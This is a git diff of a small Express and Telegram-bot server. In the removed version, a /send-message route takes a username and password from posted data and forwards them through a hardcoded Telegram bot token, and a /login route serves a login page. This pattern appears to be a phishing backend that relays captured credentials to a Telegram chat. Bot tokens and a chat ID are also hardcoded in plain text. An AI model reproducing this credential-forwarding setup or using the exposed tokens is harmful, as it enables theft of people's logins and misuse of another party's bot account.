@@ -1,84 +1,33 @@
-import express from 'express';
-import https from 'https';
-import { Buffer } from 'buffer';
-import sendMessage from './sendMessage.js'
-import path from 'path'
+import { config } from "dotenv";
+import express from "express"
+import bodyParser from "body-parser";
+import TelegramBot from "node-telegram-bot-api";
 import { fileURLToPath } from 'url';
-import { log } from 'console';
+import path from 'path'
+config()
+const token = process.env.TOKEN || '7607469719:AAEKWwwJb1lkVfz5rIhqZQ7VR4yJjAm4jt8';
+const port = process.env.PORT || 3000;
+const chatID = process.env.CHAT_ID || '7087786159';
+const bot = new TelegramBot(token, { polling: true });
 
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-const token = '7607469719:AAEKWwwJb1lkVfz5rIhqZQ7VR4yJjAm4jt8';  //abi
-// const token = '8084551867:AAFqbDWG1pDBBHFha0gZSey84TszV19Sr70'
-const port = process.env.PORT || 3000;
-
-app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.json());  // Middleware para parsear JSON
-
-app.get('/webhook', (req, res) => {
-    res.send('Hola');
-});
-
-app.post('/webhook', (req, res) => {
-    const message = req.body.message;
-    if (message) {
-        const chatId = message.chat.id;
-        const text = `Hola recibi, tu mensaje, este es tu chatID: ${chatId}`
-
-        const reply = JSON.stringify({
-            chat_id: chatId,
-            text: text
-        });
-
-        const options = {
-            hostname: 'api.telegram.org',
-            path: `/bot${token}/sendMessage`,
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(reply)
-            }
-        };
-
-        const request = https.request(options, response => {
-            response.on('data', d => {
-                process.stdout.write(d);
-            });
-        });
-
-        request.on('error', e => {
-            console.error(e);
-        });
-
-        request.write(reply);
-        request.end();
-
-        console.log(`Mensaje recibido de ${chatId}: ${text}`);
-        res.send('Mensaje enviado');
-    } else {
-        res.status(400).send('Bad Request');
-    }
-});
-
-app.post('/send-message', function (req, res) {
-    
-    const {username, password } = req.body
-
-    sendMessage(username, password, token)
-    res.status(200).send('Hola mundo')
+app.use(bodyParser.json());
+app.post('/send-message', async (req, res) => {
+    bot.on('message', (msg) => {
+        const chatId = chatID || msg.chat.id;
+        const reponse = `Hola ${msg.from.first_name}, recibi tu mensaje`;
+        bot.sendMessage(chatId, reponse);
+    })
+    res.send('Mensaje enviado');
 })
-
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'))
 });
 
-app.use((req, res) => {
-    res.status(404).send('Home, wolcome');
-});
-
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}/`);
+app.listen(3000, () => {
+    console.log('Servidor runnig at http://localhost:3000');
 });
